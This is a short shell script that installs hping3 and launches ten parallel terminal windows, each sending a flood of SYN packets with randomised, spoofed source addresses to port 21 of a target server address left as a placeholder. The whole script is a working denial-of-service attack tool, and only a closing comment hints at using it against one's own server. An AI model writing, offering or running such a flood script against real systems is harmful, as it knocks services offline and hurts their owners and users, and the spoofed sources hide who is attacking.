#!/bin/sh

# Comment below line if already having hping3
apt install hping3

for a in {1..10}
do
	xterm -e bash -c "hping3 -c 50 -d 120 -S -w 64 -p 21 --flood --rand-source <server_IP>; bash" &
done

# replace <server_IP> to your server_IP use ifconfig and search for your server IP like example 192.168.1.105